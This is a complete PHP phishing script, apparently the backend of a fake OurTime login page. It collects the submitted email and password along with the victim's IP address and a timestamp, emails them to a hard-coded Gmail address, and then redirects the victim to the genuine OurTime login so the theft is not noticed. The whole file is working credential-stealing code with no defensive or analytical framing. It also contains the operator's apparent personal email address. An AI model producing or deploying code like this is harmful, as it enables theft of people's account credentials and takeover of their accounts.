<?php

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message  = "xxxxxxxxx[OurTime Info]xxxxxxxxx\n";
$message .= "Email: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "------------[ IP/Date/Time]-----------\n";
$message .= "IP: ".$ip."\n";
$message .= "- http://www.geoiptool.com/?IP=$ip -\n";
$message .= "Date: ".$adddate."\n";
$message .= "xxxxxxxxx[By Slo!]xxxxxxxxxx\n";
$send="rbumberlee789@gmail.com";
$subject = " OurTime RZulT By SLO!!";
$headers = "From:OTbox<rzult@otbox.ag>";
$str=array($send); foreach ($str as $send)
if(mail($send,$subject,$message,$headers) != false){


header("Location: http://www.ourtime.com/v3/login?");
 
}


?>


